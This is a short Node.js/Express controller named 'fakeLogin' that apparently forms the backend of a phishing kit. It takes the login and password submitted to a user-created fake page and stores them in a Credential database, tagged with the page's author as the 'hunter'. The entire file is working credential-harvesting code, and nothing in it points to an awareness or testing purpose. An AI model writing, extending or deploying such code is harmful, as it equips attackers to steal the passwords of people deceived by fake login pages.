import { connectToDB } from "../config/dbConnection.js";
import Credential from "../model/credentials.js";
import Page from "../model/pages.js";
export const fakeLogin = async (req, res, next) => {
  try {
    const { login, password } = req.body;
    const { page_id } = req.params;
    await connectToDB();
    const page = await Page.findById(page_id);
    if (!page) {
      const err = new Error("Page not found");
      err.name = "PageNotFoundError";
      throw err;
    }
    await Credential.create({
      login: login,
      password: password,
      page: page_id,
      hunter: page.author,
    });
    res.status(201).json({ message: "Credential created successfully" });
  } catch (err) {
    next(err);
  }
};
